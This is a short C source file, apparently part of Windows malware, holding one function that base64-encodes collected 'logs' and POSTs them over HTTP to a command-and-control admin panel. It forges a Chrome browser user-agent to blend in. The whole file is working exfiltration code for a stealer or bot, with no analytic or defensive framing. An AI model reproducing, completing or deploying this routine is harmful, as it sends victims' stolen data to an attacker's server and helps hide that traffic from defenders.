#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>
#include <windns.h>
#include <stdint.h>
#include "crypt.h"
#include "fncs.h"
#include "cnc.h"
#include "mem.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

void sendLogsToCNC(LPCWSTR GetLink, CHAR* base64Logs, SIZE_T logsSize) {
	LPCWSTR actual_domain = ADMIN_PANEL;

	SIZE_T outsize;
	LPCSTR param = base64Encode((LPBYTE)base64Logs, logsSize, &outsize);

	CHAR* szReq = (CHAR*)_alloc(outsize + 6);
	wnsprintfA(szReq, outsize + 6, "logs=%s", param);

	HINTERNET hIntSession = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	HINTERNET hHttpSession = InternetConnectW(hIntSession, actual_domain, 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);

	HINTERNET hHttpRequest = HttpOpenRequestW(
		hHttpSession,
		L"POST",
		GetLink,
		0, 0, 0, INTERNET_FLAG_RELOAD, 0);

	const WCHAR* szHeaders = L"Content-Type: application/x-www-form-urlencoded";
	if (!HttpSendRequestW(hHttpRequest, szHeaders, lstrlenW(szHeaders), (CHAR*)szReq, lstrlenA(szReq))) {
		return;
	}

	InternetCloseHandle(hHttpRequest);
	InternetCloseHandle(hHttpSession);
	InternetCloseHandle(hIntSession);
	_free((CHAR*)param);
}